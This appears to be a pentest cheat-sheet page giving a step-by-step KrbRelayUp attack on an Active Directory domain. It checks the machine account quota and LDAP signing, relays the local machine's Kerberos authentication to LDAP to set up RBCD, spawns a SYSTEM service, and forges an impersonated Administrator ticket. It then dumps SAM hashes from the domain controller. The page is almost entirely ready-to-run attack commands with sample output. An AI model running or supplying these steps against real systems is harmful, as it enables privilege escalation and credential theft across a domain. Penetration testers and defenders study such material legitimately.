---
title: "KrbRelayUp"
date: 2025-8-4
tags: ["KrbRelayUp", "Active Directory", "Local Privilege Escalation", "Kerberos Relay", "LDAP Signing", "Shadow Credentials", "ADCS Web Enrollment", "RBCD", "S4U2Self", "SCMUACBypass"]
---

### Prerequisite

#### 1. Machine Quota

```console
nxc ldap <TARGET_DOMAIN> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M maq
```

```console {class="sample-code"}
$ nxc ldap DC01.example.com -u 'apple.seed' -p 'Password' -d example.com -M maq
LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:Password 
MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota
MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10
```

#### 2. LDAP Signing NOT Enforced

```console
nxc ldap <TARGET_DOMAIN> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M ldap-checker
```

```console {class="sample-code"}
$ nxc ldap DC01.example.com -u 'apple.seed' -p 'Password' -d example.com -M ldap-checker
LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:Password 
LDAP-CHE... 10.10.72.181    389    DC01          LDAP signing NOT enforced
LDAP-CHE... 10.10.72.181    389    DC01          LDAPS channel binding is set to: Never
```

---

### Abuse #1: Create Control Primitive over Local Machine using RBCD

{{< tab set1 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Coerce Kerberos Auth from Local Machine Account, Relay it to LDAP

```console
.\KrbRelayUp.exe relay -Domain <DOMAIN> -CreateNewComputerAccount -ComputerName <NEW_COMPUTER>$ -ComputerPassword <NEW_PASSWORD> --clsid <CLSID>
```

```console {class="sample-code"}
PS C:\ProgramData> .\KrbRelayUp.exe relay -Domain example.com -CreateNewComputerAccount -ComputerName Test$ -ComputerPassword Test1234 --clsid d99e6e73-fc88-11d0-b498-00a0c90312f3
.\KrbRelayUp.exe relay -Domain example.com -CreateNewComputerAccount -ComputerName Test$ -ComputerPassword Test1234 --clsid d99e6e73-fc88-11d0-b498-00a0c90312f3
KrbRelayUp - Relaying you to SYSTEM


[+] Rewriting function table
[+] Rewriting PEB
[+] Init COM server
[+] Computer account "Test$" added with password "Test1234"
[+] Looking for available ports..
[+] Port 10246 available
[+] Register COM server
[+] Forcing SYSTEM authentication
[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
[+] LDAP session established
[+] RBCD rights added successfully
[+] Run the spawn method for SYSTEM shell:
    ./KrbRelayUp.exe spawn -m rbcd -d example.com -dc dc01.example.com -cn Test$ -cp Test1234
```

#### 2. Obtain a Kerberos Service Ticket and Use it to Create a New Service Running as SYSTEM

```console
.\KrbRelayUp.exe spawn -m rbcd -d <DOMAIN> -dc <DC> -cn <NEW_COMPUTER>$ -cp <NEW_PASSWORD>
```

```console {class="sample-code"}
PS C:\ProgramData> .\KrbRelayUp.exe spawn -m rbcd -d example.com -dc dc01.example.com -cn Test$ -cp Test1234
.\KrbRelayUp.exe spawn -m rbcd -d example.com -dc dc01.example.com -cn Test$ -cp Test1234
KrbRelayUp - Relaying you to SYSTEM

[+] TGT request successful!
[+] Building S4U2self 
[+] Using domain controller: dc01.example.com (fe80::988d:722f:af5:6fb9%6)
[+] Sending S4U2self request to fe80::988d:722f:af5:6fb9%6:88
[+] S4U2self success!
[+] Got a TGS for 'Administrator' to 'Test$@EXAMPLE.COM'
[+] Impersonating user 'Administrator' to target SPN 'HOST/DC01'
[+] Building S4U2proxy request for service: 'HOST/DC01'
[+] Using domain controller: dc01.example.com (fe80::988d:722f:af5:6fb9%6)
[+] Sending S4U2proxy request to domain controller fe80::988d:722f:af5:6fb9%6:88
[+] S4U2proxy success!
[+] Ticket successfully imported!
[+] Using ticket to connect to Service Manger
[+] AcquireCredentialsHandleHook called for package N
[+] Changing to Kerberos package
[+] InitializeSecurityContextHook called for target H
[+] InitializeSecurityContext status = 0x00090312
[+] InitializeSecurityContextHook called for target H
[+] InitializeSecurityContext status = 0x00000000
[+] KrbSCM Service created
[+] KrbSCM Service started
[+] Clean-up done
```

#### 3. Request a Service Ticket

```console
impacket-getST -spn cifs/<DC> -impersonate Administrator -dc-ip <DC_IP> '<DOMAIN>/<NEW_COMPUTER>$:<NEW_PASSWORD>'   
```

```console {class="sample-code"}
$ impacket-getST -spn cifs/dc01.example.com -impersonate Administrator -dc-ip 10.10.72.181 example.com/'Test$':'Test1234'   
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc01.example.com@EXAMPLE.COM.ccache
```

#### 4. Secrets Dump

```console
# Import ticket
export KRB5CCNAME='Administrator@cifs_<DC>@<DOMAIN>.ccache'
```

```console {class="sample-code"}
export KRB5CCNAME='Administrator@cifs_dc01.example.com@EXAMPLE.COM.ccache'
```

```console
# Check
klist
```

```console {class="sample-code"}
$ klist
Ticket cache: FILE:Administrator@cifs_dc01.example.com@EXAMPLE.COM.ccache
Default principal: Administrator@example.com

Valid starting       Expires              Service principal
2025-08-04T16:20:45  2025-08-05T02:20:44  cifs/dc01.example.com@EXAMPLE.COM
        renew until 2025-08-05T16:20:44
```

```console
# Secrets dump
impacket-secretsdump -k -no-pass <DC>
```

```console {class="sample-code"}
$ impacket-secretsdump -k -no-pass DC01.example.com                                                                   
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf58ac639976f0c99c2dde0d24ef3219d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:---[REDACTED]---:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:---[REDACTED]---:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:---[REDACTED]---:::
```

{{< /tabcontent >}}
